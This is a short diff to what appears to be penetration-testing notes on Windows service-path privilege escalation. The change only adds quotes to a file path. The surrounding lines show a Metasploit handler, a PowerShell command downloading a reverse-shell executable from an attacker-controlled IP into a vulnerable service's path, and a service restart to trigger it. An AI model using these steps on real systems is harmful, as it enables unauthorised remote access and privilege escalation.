@@ -43,7 +43,7 @@ use exploit/multi/handler
 ```
 Transfer file to target machine at the vulnerable service path:
 ```powershell
-iwr -uri http://$(IP_ADDRESS)/reverse.exe -Outfile C:\Vulnerable\Service\Path.exe
+iwr -uri http://$(IP_ADDRESS)/reverse.exe -Outfile "C:\Vulnerable\Service\Path.exe"
 ```
 # Restart service
 Either restart revice manually or reboot the target (assuming the service is set to automatic startup)
